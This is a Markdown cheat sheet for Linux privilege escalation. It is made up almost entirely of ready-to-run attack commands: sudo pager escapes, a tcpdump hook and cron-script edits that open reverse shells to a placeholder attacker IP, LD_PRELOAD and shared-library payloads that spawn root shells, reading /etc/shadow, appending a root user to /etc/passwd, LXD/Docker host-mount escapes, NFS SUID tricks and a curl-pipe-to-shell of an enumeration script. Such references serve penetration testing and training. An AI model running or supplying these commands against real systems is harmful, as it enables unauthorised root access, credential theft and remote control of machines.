+++
title = "Linux Privilege Escalation"
date = "2026-05-05T00:00:00-05:00"
tags = ["linux", "privesc", "privilege-escalation"]
description = "Linux privesc via SUID/SGID, sudo abuse, capabilities, cron, writable paths, shared libraries, LXD/Docker, and NFS."
draft = false
+++

## Quick Enumeration

```bash
id && whoami
sudo -l
cat /etc/passwd | grep -v nologin
cat /etc/crontab
ls -la /etc/cron*
find / -perm -4000 2>/dev/null           # SUID
find / -perm -2000 2>/dev/null           # SGID
getcap -r / 2>/dev/null                  # capabilities
env
uname -a
cat /proc/version
```

---

## sudo -l Abuse

### GTFOBins — always check https://gtfobins.github.io/

```bash
# NOPASSWD: /usr/bin/nano → get shell
sudo nano /opt/somefile
# In nano: Ctrl+R → Ctrl+X → type: reset; sh 1>&0 2>&0

# NOPASSWD: /usr/bin/openssl → read files
sudo openssl enc -in /etc/shadow

# NOPASSWD: /usr/sbin/tcpdump → RCE via postrotate
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 443 >/tmp/f' > /tmp/.hook
chmod +x /tmp/.hook
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.hook -Z root

# NOPASSWD: /usr/sbin/journalctl → less pager escape
sudo /usr/bin/journalctl -n5 -usome.service
# At the pager: !/bin/bash

# CVE-2019-14287 (sudo < 1.8.28) — bypass user restriction
# (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash

# LD_PRELOAD preserved — load malicious .so
# sudo entry: (root) NOPASSWD: SETENV: /usr/bin/python3
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/bin/python3 /some/script.py
```

---

## SUID / SGID Binaries

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null   # SUID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null   # SUID+SGID

# Check any hit against GTFOBins for SUID abuse
# Common: find, vim, python, cp, bash, nmap, env, less, more, man, tee

# bash SUID
/bin/bash -p   # -p preserves EUID

# find SUID
find . -exec /bin/sh -p \; -quit

# Python SUID script that imports a writable module
# 1. Find which module it imports: grep import script.py
# 2. Find writable copy: ls -l /usr/local/lib/python3.x/dist-packages/module.py
# 3. Inject reverse shell into the module function
# 4. Run: sudo /usr/bin/python3 script.py
```

---

## Capabilities

```bash
getcap -r / 2>/dev/null

# Dangerous capabilities
cap_setuid      # → set UID to 0
cap_net_raw     # → raw sockets (ping, scapy)
cap_dac_read_search  # → bypass file read permissions

# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## Cron Job Abuse

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
crontab -l

# If cron runs a script you can write to:
echo 'bash -i >& /dev/tcp/<ip>/443 0>&1' >> /path/to/script.sh

# If cron runs a script in a writable directory — replace it
cp /bin/bash /tmp/bash && chmod +s /tmp/bash   # as payload
# then: /tmp/bash -p

# PATH hijack — if cron script calls a binary without full path
# and PATH is writable before /usr/bin
echo '#!/bin/bash\nbash -i >& /dev/tcp/<ip>/443 0>&1' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Wait for cron to run
```

---

## Writable /etc/passwd

```bash
# Check
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hack password123
# or: python3 -c "import crypt; print(crypt.crypt('password123', '\$1\$hack\$'))"

# Append root-equivalent user
echo 'hacker:$1$hack$WaVaRFBRuE0LE6S2oFaZz/:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: password123
```

---

## Shared Library Hijack

```bash
# Check if binary uses rpath / runpath or LD_LIBRARY_PATH
ldd /usr/local/bin/binary
readelf -d /usr/local/bin/binary | grep -i rpath

# If binary loads a library from a writable path:
cat > /tmp/lib.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void hijack() __attribute__((constructor));
void hijack() { setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/libhijack.so /tmp/lib.c
```

---

## LXD / Docker Group Abuse

```bash
# Check group membership
id | grep -E 'lxd|docker'

# LXD — mount host root into container
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
# Now: cd /mnt/root → full host filesystem as root

# Docker — mount host root into container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker socket writable
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash
```

---

## NFS No_Root_Squash

```bash
# Check exports on target
cat /etc/exports
# Look for: no_root_squash

# Mount from attacker
showmount -e <target-ip>
mkdir /tmp/nfsmount
mount -t nfs <target-ip>:/share /tmp/nfsmount

# Create SUID bash on attacker (running as root)
cp /bin/bash /tmp/nfsmount/rootbash
chmod +s /tmp/nfsmount/rootbash

# On target
/share/rootbash -p   # → root shell
```

---

## Automated Enumeration

```bash
# LinPEAS — most comprehensive
curl -sL https://linpeas.sh | sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas.out

# Linux Smart Enumeration
./lse.sh -l 1    # level 1 = interesting findings only
./lse.sh -l 2    # level 2 = everything

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

---

## Shell Upgrades

```bash
# After getting a basic shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Or: use rlwrap on listener
rlwrap nc -lvnp 443

# Spawn TTY alternatives
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
```
